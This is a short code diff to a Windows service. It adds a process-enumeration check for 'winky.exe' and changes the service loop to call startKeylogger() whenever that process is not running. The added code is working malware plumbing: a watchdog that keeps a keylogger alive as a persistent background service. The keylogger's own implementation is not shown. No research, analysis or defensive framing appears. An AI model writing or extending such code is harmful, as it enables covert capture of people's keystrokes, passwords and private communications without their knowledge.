@@ -169,6 +169,26 @@ VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
     }
 }
 
+bool checkIfProccessRunning(const char* filename)
+{
+    bool isRunning = false;
+
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    PROCESSENTRY32 pEntry;
+    pEntry.dwSize = sizeof(pEntry);
+    BOOL hRes = Process32First(hSnapShot, &pEntry);
+    while (hRes)
+    {
+        if (strcmp(pEntry.szExeFile, filename) == 0)
+        {
+            isRunning = true;
+        }
+        hRes = Process32Next(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+    return (isRunning);
+}
+
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 {
     lpParam = NULL;
@@ -178,10 +198,12 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
         /*
          * Perform main service function here
          */
-
+        if (checkIfProccessRunning("winky.exe") == false)
+        {
+            startKeylogger();
+        }
          //  Simulate some work by sleeping
-        printf("helloworld");
-        Sleep(3000);
+        Sleep(1000);
     }
 
     return ERROR_SUCCESS;
